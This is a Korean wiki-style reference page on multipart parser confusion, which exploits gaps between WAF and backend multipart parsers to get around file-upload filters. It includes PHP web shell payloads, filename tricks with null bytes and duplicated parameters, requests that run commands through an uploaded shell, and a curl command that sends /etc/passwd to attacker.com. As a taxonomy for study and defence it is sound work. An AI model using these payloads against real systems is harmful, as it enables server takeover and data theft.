---
title: Multipart Parser Confusion
description: 
published: true
date: 2025-07-31T16:05:40.593Z
tags: attack success validation, data exfiltration, body field manipulation, boundary manipulation, backend parser profiling, malicious file execution
editor: markdown
dateCreated: 2025-07-23T10:42:58.510Z
---

# Multipart Parser Confusion

## 개요
“Multipart Parser Confusion”는 `multipart/form-data` 요청 처리 시 파서 간 해석 불일치를 이용해 필드 이름 충돌이나 무시를 유도하는 기법이다. 이는 프레임워크별 멀티파트 파서가 CRLF·중복 필드·헤더 순서·경계 처리 등에서 서로 다른 규칙을 따르기 때문에 발생하며, Express.js·Fastify·Flask·Spring Boot 등 다양한 웹 프레임워크에서 재현된다. 공격자는 우회 입력을 통해 필수 파라미터를 삭제하거나 인증 우회·파일 업로드 제한을 회피하는 행위를 유도할 수 있으며, 그 결과로 인증 우회·파일 업로드 제한 우회·접근 제어 우회 등의 보안 문제가 발생한다.


## 분류

> 구문 분석 불일치 (Syntax Parsing Gap)  
> → 데이터 경계 파싱 불일치 (Boundary Parsing Mismatch)  
> → Multipart Parser Confusion

## 절차

<table>
  <thead>
    <tr>
      <th>Phase</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Reconnaissance</td>
      <td>앞단 필터(WAF·CDN)와 뒤쪽 애플리케이션(PHP, Node Busboy, Python Flask 등)이 서로 다른 멀티파트 파서를 사용하는지 조사하고, filename·name 중복 처리 방식, <code>\r\n\r\n</code> 구분이 얼마나 엄격한지, 종료 boundary 필요 여부 같은 규칙 차이를 찾아낸다.</td>
    </tr>
    <tr>
      <td>Obfuscation</td>
      <td>Zero‑Width 문자, 퍼센트 인코딩(<code>%2e</code>), 널 바이트(<code>\x00</code>) 등을 섞어 요청을 난독화 해 WAF 시그니처나 로깅에서 눈에 띄지 않도록 한다.</td>
    </tr>
    <tr>
      <td>Validation</td>
      <td>응답 코드, 서버 로그, 업로드 디렉터리를 확인해 금지 파일이 실제로 저장됐는지, 파싱 불일치가 발생했는지 검증한다.</td>
    </tr>
    <tr>
      <td>Exploitation</td>
      <td>검증된 요청을 이용해 웹 셸 업로드, 원격 코드 실행, SQLi·XSS 삽입 등 실질적인 공격을 수행한다.</td>
    </tr>
    <tr>
      <td>Exfiltration</td>
      <td>웹 셸이나 악성 스크립트를 통해 쿠키·토큰·시스템 정보를 Beacon·WebSocket 등으로 외부 서버에 전송해 지속적 접근을 확보한다.</td>
    </tr>
  </tbody>
</table>

<div style="text-align: left;">
  <img
    src="/multipart_parser_confusion.png"
    alt="Multipart Parser Validation Bypass 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격 기법

### Reconnaissance
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Backend Parser Profiling</td>
      <td>
        <pre><code>
Host: example.com
Content-Type: multipart/form-data; boundary=xxx
--xxx
        Content-Disposition: form-data; name="test_file"; filename="test.jpg"
        Content-Type: image/jpeg
        ... the image ...
--xxx--
</code>
</pre>
      </td>
      <td>다양한 변형(중복 filename, 비정상적 boundary 등)이 적용된 multipart 요청을 전송해, WAF와 백엔드 파서의 동작 차이와 해석 불일치(semantic gap)를 식별한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>


### Obfuscation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Encoding Obfuscation</td>
      <td><pre><code>--xxx
Content-Disposition: form-data; name="file\u200B"; filename="%2e%2e%2ffile.php"
&lt;?php system($_GET['cmd']); ?&gt;
--xxx--</code></pre></td>
      <td>Zero‑Width 문자(<code>\u200B</code>)와 percent-encoding(<code>%2e</code>) 등을 혼합해, WAF 서명·로깅 탐지를 우회한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Null Byte Injection</td>
      <td><pre><code>--xxx
Content-Disposition: form-data; name="file"; filename="image.png\x00.php"
&lt;?php system($_GET['cmd']); ?&gt;
--xxx--</code></pre></td>
      <td>filename 값에 널 바이트(<code>\x00</code>)를 삽입하여 문자열 종료를 유도, WAF의 확장자 필터링을 무력화하고 백엔드가 악성 파일을 저장하도록 한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>


### Desync
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Boundary Desynchronization</td>
      <td><pre><code>--xxx
Content-Disposition: form-data; name="file"; filename="evil.php"
&lt;?php system($_GET['cmd']); ?&gt;
--xxx</code></pre></td>
      <td>경계 종료 마커(<code>--</code>)를 누락시켜 WAF 검증을 통과시키고, 백엔드 파서는 여전히 파일을 수락하여 악성 웹 셸을 저장하도록 만든다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Quoted Parameter Omission</td>
      <td><pre><code>--xxx
Content-Disposition: form-data; name="file"; filename=backdoor.php
&lt;?php system($_GET['cmd']); ?&gt;
--xxx--</code></pre></td>
      <td>filename 매개변수의 따옴표를 제거해 WAF가 파싱하지 못하게 하고, 백엔드 파서는 이를 수락하여 우회 공격을 가능하게 한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Duplicated Filename Parameter</td>
      <td><pre><code>--xxx
Content-Disposition: form-data; name="file"; filename="safe.txt"; filename="shell.php"
Content-Type: application/octet-stream
&lt;?php system($_GET['cmd']); ?&gt;
--xxx--</code></pre></td>
      <td>Content-Disposition 헤더 내에 filename 파라미터를 중복 선언하여, WAF와 백엔드가 서로 다른 값을 채택하는 해석 차이를 유발, 파일 업로드 제한을 우회한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Upload Success Validation</td>
      <td><pre><code>GET /uploads/shell.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*</code></pre></td>
      <td>공격 페이로드로 업로드된 파일 경로에 직접 HTTP GET 요청을 보내, 서버의 응답 코드(200 OK 등)나 실행 결과를 통해 공격 성공 여부를 최종 검증한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Malicious File Execution</td>
      <td><pre><code>GET /uploads/shell.php?cmd=id HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*</code></pre></td>
      <td>업로드된 웹셸에 시스템 명령어(id, whoami 등)를 파라미터로 전달하여 원격 코드 실행(RCE)을 트리거하고, 서버 제어 권한을 획득한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Remote Data Exfiltration</td>
      <td><pre><code># 웹셀 내부에서 실행될 수 있는 예시 명령어
curl -X POST -d "data=$(cat /etc/passwd | base64)" http://attacker.com/data_leak</code></pre></td>
      <td>웹셸을 통해 서버 내 민감 정보(cat /etc/passwd 등)를 조회하고, curl 등의 도구를 이용해 외부 공격자 서버로 유출하여 추가 피해를 유발한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

---

## 분류에 해당하는 문서
- [1] [Breaking Down Multipart Parsers: File upload validation bypass](https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/)  
